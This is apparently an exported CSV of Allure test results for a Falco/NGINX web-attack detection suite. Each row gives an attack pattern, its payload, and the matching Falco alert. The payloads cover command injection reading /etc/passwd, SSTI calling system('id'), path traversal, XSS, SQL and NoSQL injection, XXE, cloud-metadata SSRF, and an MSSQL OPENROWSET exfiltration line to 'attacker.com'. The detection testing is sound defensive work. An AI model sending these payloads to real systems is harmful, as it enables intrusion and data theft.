"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_CHUNK_002` |
| **Name** | Obfuscated Chunked |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | chunked |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `Transfer-Encoding: xchunked`
- **Encoded**: `Transfer-Encoding%3A%20xchunked`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~12000ms
- **Timestamp**: 14:45:46.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_002-1770821146841-rwt2c pattern_id=HRS_CHUNK_002 uri=/?q=Transfer-Encoding%3A%20xchunked client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_002-1770821146841-rwt2c pattern_id=HRS_CHUNK_002 uri=/?q=Transfer-Encoding%3A%20xchunked client=127.0.0.1

**Falco Log Entry**:
```
14:45:46.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_002-1770821146841-rwt2c pattern_id=HRS_CHUNK_002 uri=/?q=Transfer-Encoding%3A%20xchunked client=127.0.0.1
```","2","test_e2e_with_logs[405_HRS_CHUNK_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_PIPE_001` |
| **Name** | Password file piped to grep |
| **Category** | CMDINJ |
| **Subcategory** | pipe_chaining |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `cat /etc/passwd | grep root`
- **Encoded**: `cat%20%2Fetc%2Fpasswd%20%7C%20grep%20root`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~58000ms
- **Timestamp**: 14:45:00.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_001-1770821100866-qvcd8o pattern_id=CMD_PIPE_001 uri=/?q=cat%20%2Fetc%2Fpasswd%20%7C%20grep%20root client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_001-1770821100866-qvcd8o pattern_id=CMD_PIPE_001 uri=/?q=cat%20%2Fetc%2Fpasswd%20%7C%20grep%20root client=127.0.0.1

**Falco Log Entry**:
```
14:45:00.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_PIPE_001-1770821100866-qvcd8o pattern_id=CMD_PIPE_001 uri=/?q=cat%20%2Fetc%2Fpasswd%20%7C%20grep%20root client=127.0.0.1
```","2","test_e2e_with_logs[351_CMD_PIPE_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_SMARTY_001` |
| **Name** | Smarty PHP code execution |
| **Category** | SSTI |
| **Subcategory** | smarty |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{php}system(""id"");{/php}`
- **Encoded**: `%7Bphp%7Dsystem(%22id%22)%3B%7B%2Fphp%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~36000ms
- **Timestamp**: 14:45:22.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSTI] Server-Side Template Injection detected` |
| **Matched Rule** | `[NGINX SSTI] Server-Side Template Injection detected test_id=SSTI_SMARTY_001-1770821122845-q563k pattern_id=SSTI_SMARTY_001 uri=/?q=%7Bphp%7Dsystem(%22id%22)%3B%7B%2Fphp%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSTI] Server-Side Template Injection detected test_id=SSTI_SMARTY_001-1770821122845-q563k pattern_id=SSTI_SMARTY_001 uri=/?q=%7Bphp%7Dsystem(%22id%22)%3B%7B%2Fphp%7D client=127.0.0.1

**Falco Log Entry**:
```
14:45:22.000000000: Critical [NGINX SSTI] Server-Side Template Injection detected test_id=SSTI_SMARTY_001-1770821122845-q563k pattern_id=SSTI_SMARTY_001 uri=/?q=%7Bphp%7Dsystem(%22id%22)%3B%7B%2Fphp%7D client=127.0.0.1
```","2","test_e2e_with_logs[510_SSTI_SMARTY_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_018` |
| **Name** | Dollar-paren command substitution |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$(uname -a)`
- **Encoded**: `%24(uname%20-a)`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~61000ms
- **Timestamp**: 14:44:57.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_BASIC_018-1770821097858-oa7vx pattern_id=CMD_BASIC_018 uri=/?q=%24(uname%20-a) client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_BASIC_018-1770821097858-oa7vx pattern_id=CMD_BASIC_018 uri=/?q=%24(uname%20-a) client=127.0.0.1

**Falco Log Entry**:
```
14:44:57.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BASIC_018-1770821097858-oa7vx pattern_id=CMD_BASIC_018 uri=/?q=%24(uname%20-a) client=127.0.0.1
```","1","test_e2e_with_logs[317_CMD_BASIC_018]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `NOSQL_MONGO_002` |
| **Name** | MongoDB $regex bypass |
| **Category** | NOSQL_EXTENDED |
| **Subcategory** | mongodb |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{""username"": {""$regex"": ""^admin""}}`
- **Encoded**: `%7B%22username%22%3A%20%7B%22%24regex%22%3A%20%22%5Eadmin%22%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~33000ms
- **Timestamp**: 14:45:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_002-1770821125838-kuqhk pattern_id=NOSQL_MONGO_002 uri=/?q=%7B%22username%22%3A%20%7B%22%24regex%22%3A%20%22%5Eadmin%22%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_002-1770821125838-kuqhk pattern_id=NOSQL_MONGO_002 uri=/?q=%7B%22username%22%3A%20%7B%22%24regex%22%3A%20%22%5Eadmin%22%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
14:45:25.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_002-1770821125838-kuqhk pattern_id=NOSQL_MONGO_002 uri=/?q=%7B%22username%22%3A%20%7B%22%24regex%22%3A%20%22%5Eadmin%22%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[478_NOSQL_MONGO_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_063` |
| **Name** | Image onerror Handler |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<img src=x onerror=alert(1)>`
- **Encoded**: `%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~48000ms
- **Timestamp**: 14:45:10.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_063-1770821110407-n4ilb pattern_id=XSS_ADV_063 uri=/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_063-1770821110407-n4ilb pattern_id=XSS_ADV_063 uri=/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:45:10.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_063-1770821110407-n4ilb pattern_id=XSS_ADV_063 uri=/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[131_XSS_ADV_063]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_TRUNC_001` |
| **Name** | Null byte truncation |
| **Category** | PATH |
| **Subcategory** | truncation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../etc/passwd%00.jpg`
- **Encoded**: `..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~54000ms
- **Timestamp**: 14:45:04.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_TRUNC_001-1770821104382-zco9zd pattern_id=PATH_TRUNC_001 uri=/?q=..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_TRUNC_001-1770821104382-zco9zd pattern_id=PATH_TRUNC_001 uri=/?q=..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1

**Falco Log Entry**:
```
14:45:04.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_TRUNC_001-1770821104382-zco9zd pattern_id=PATH_TRUNC_001 uri=/?q=..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1
```","2","test_e2e_with_logs[258_PATH_TRUNC_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_STORED_003` |
| **Name** | Stored SVG onload XSS |
| **Category** | XSS |
| **Subcategory** | stored |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<svg onload=alert('Stored')>`
- **Encoded**: `%3Csvg%20onload%3Dalert%28%27Stored%27%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 14:45:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_STORED_003-1770821115921-ij5djk pattern_id=XSS_STORED_003 uri=/?q=%3Csvg%20onload%3Dalert%28%27Stored%27%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_STORED_003-1770821115921-ij5djk pattern_id=XSS_STORED_003 uri=/?q=%3Csvg%20onload%3Dalert%28%27Stored%27%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:45:15.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_STORED_003-1770821115921-ij5djk pattern_id=XSS_STORED_003 uri=/?q=%3Csvg%20onload%3Dalert%28%27Stored%27%29%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[205_XSS_STORED_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_005` |
| **Name** | Subquery error-based injection |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT * FROM users WHERE id=1) --`
- **Encoded**: `'%20AND%20(SELECT%20*%20FROM%20users%20WHERE%20id%3D1)%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~68000ms
- **Timestamp**: 14:44:50.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_005-1770821090873-jl8hl pattern_id=SQLI_ERROR_005 uri=/?q='%20AND%20(SELECT%20*%20FROM%20users%20WHERE%20id%3D1)%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_005-1770821090873-jl8hl pattern_id=SQLI_ERROR_005 uri=/?q='%20AND%20(SELECT%20*%20FROM%20users%20WHERE%20id%3D1)%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:44:50.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_005-1770821090873-jl8hl pattern_id=SQLI_ERROR_005 uri=/?q='%20AND%20(SELECT%20*%20FROM%20users%20WHERE%20id%3D1)%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[066_SQLI_ERROR_005]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_CLOUD_002` |
| **Name** | GCP Metadata Service Access |
| **Category** | SSRF |
| **Subcategory** | cloud_metadata |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `http://metadata.google.internal/computeMetadata/v1/`
- **Encoded**: `http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~9000ms
- **Timestamp**: 14:45:49.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_CLOUD_002-1770821149836-xovfen pattern_id=SSRF_CLOUD_002 uri=/?q=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_CLOUD_002-1770821149836-xovfen pattern_id=SSRF_CLOUD_002 uri=/?q=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F client=127.0.0.1

**Falco Log Entry**:
```
14:45:49.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_CLOUD_002-1770821149836-xovfen pattern_id=SSRF_CLOUD_002 uri=/?q=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F client=127.0.0.1
```","1","test_e2e_with_logs[407_SSRF_CLOUD_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_MONGO_005` |
| **Name** | MongoDB JavaScript code injection |
| **Category** | OTHER |
| **Subcategory** | mongodb_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; return db.users.find(); //`
- **Encoded**: `%27%3B%20return%20db.users.find%28%29%3B%20//`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~62000ms
- **Timestamp**: 14:44:56.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_005-1770821096341-j19gin pattern_id=EMRG_MONGO_005 uri=/?q=%27%3B%20return%20db.users.find%28%29%3B%20// client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_005-1770821096341-j19gin pattern_id=EMRG_MONGO_005 uri=/?q=%27%3B%20return%20db.users.find%28%29%3B%20// client=127.0.0.1

**Falco Log Entry**:
```
14:44:56.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_005-1770821096341-j19gin pattern_id=EMRG_MONGO_005 uri=/?q=%27%3B%20return%20db.users.find%28%29%3B%20// client=127.0.0.1
```","2","test_e2e_with_logs[483_EMRG_MONGO_005]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_OOB_002` |
| **Name** | MSSQL OpenRowset Data Exfil |
| **Category** | SQLI |
| **Subcategory** | out_of_band |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; SELECT * FROM OPENROWSET('SQLOLEDB','attacker.com';'sa';'pwd','SELECT 1')--`
- **Encoded**: `'%3B%20SELECT%20*%20FROM%20OPENROWSET('SQLOLEDB'%2C'attacker.com'%3B'sa'%3B'pwd'%2C'SELECT%201')--`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[082_SQLI_OOB_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_005` |
| **Name** | XXE data URI scheme injection |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM ""data:text/plain;base64,dGVzdA=="">`
- **Encoded**: `%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 14:45:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_005-1770821106343-pesq0a pattern_id=XXE_ENTITY_005 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_005-1770821106343-pesq0a pattern_id=XXE_ENTITY_005 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E client=127.0.0.1

**Falco Log Entry**:
```
14:45:06.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_005-1770821106343-pesq0a pattern_id=XXE_ENTITY_005 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[440_XXE_ENTITY_005]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_BOOL_001` |
| **Name** | XPath boolean injection |
| **Category** | XPATH |
| **Subcategory** | boolean_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' or '1'='1`
- **Encoded**: `%27%20or%20%271%27%3D%271`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~44000ms
- **Timestamp**: 14:45:14.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_BOOL_001-1770821114336-a2v8j pattern_id=XPATH_BOOL_001 uri=/?q=%27%20or%20%271%27%3D%271 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_BOOL_001-1770821114336-a2v8j pattern_id=XPATH_BOOL_001 uri=/?q=%27%20or%20%271%27%3D%271 client=127.0.0.1

**Falco Log Entry**:
```
14:45:14.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_BOOL_001-1770821114336-a2v8j pattern_id=XPATH_BOOL_001 uri=/?q=%27%20or%20%271%27%3D%271 client=127.0.0.1
```","2","test_e2e_with_logs[400_XPATH_BOOL_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_MASS_003` |
| **Name** | Mass Assignment Role Admin Direct |
| **Category** | API_SECURITY |
| **Subcategory** | mass_assignment |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{""email"":""test@test.com"",""role"":""admin""}`
- **Encoded**: `%7B%22email%22%3A%22test%40test.com%22%2C%22role%22%3A%22admin%22%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~25000ms
- **Timestamp**: 14:45:33.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_MASS_003-1770821133346-achvpw pattern_id=API_MASS_003 uri=/?q=%7B%22email%22%3A%22test%40test.com%22%2C%22role%22%3A%22admin%22%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_MASS_003-1770821133346-achvpw pattern_id=API_MASS_003 uri=/?q=%7B%22email%22%3A%22test%40test.com%22%2C%22role%22%3A%22admin%22%7D client=127.0.0.1

**Falco Log Entry**:
```
14:45:33.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_MASS_003-1770821133346-achvpw pattern_id=API_MASS_003 uri=/?q=%7B%22email%22%3A%22test%40test.com%22%2C%22role%22%3A%22admin%22%7D client=127.0.0.1
```","2","test_e2e_with_logs[473_API_MASS_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_019` |
| **Name** | URL encoded newline injection |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%0als`
- **Encoded**: `%250als`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 14:44:58.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_019-1770821098359-k5dkny pattern_id=CMD_BASIC_019 uri=/?q=%250als client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_019-1770821098359-k5dkny pattern_id=CMD_BASIC_019 uri=/?q=%250als client=127.0.0.1

**Falco Log Entry**:
```
14:44:58.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_019-1770821098359-k5dkny pattern_id=CMD_BASIC_019 uri=/?q=%250als client=127.0.0.1
```","1","test_e2e_with_logs[318_CMD_BASIC_019]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_NORM_003` |
| **Name** | URL encoded backslash |
| **Category** | PATH |
| **Subcategory** | normalization |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..%5c..%5c..%5cetc%5cpasswd`
- **Encoded**: `..%255c..%255c..%255cetc%255cpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 14:45:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_NORM_003-1770821106387-th9wn8 pattern_id=PATH_NORM_003 uri=/?q=..%255c..%255c..%255cetc%255cpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_NORM_003-1770821106387-th9wn8 pattern_id=PATH_NORM_003 uri=/?q=..%255c..%255c..%255cetc%255cpasswd client=127.0.0.1

**Falco Log Entry**:
```
14:45:06.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_NORM_003-1770821106387-th9wn8 pattern_id=PATH_NORM_003 uri=/?q=..%255c..%255c..%255cetc%255cpasswd client=127.0.0.1
```","2","test_e2e_with_logs[253_PATH_NORM_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
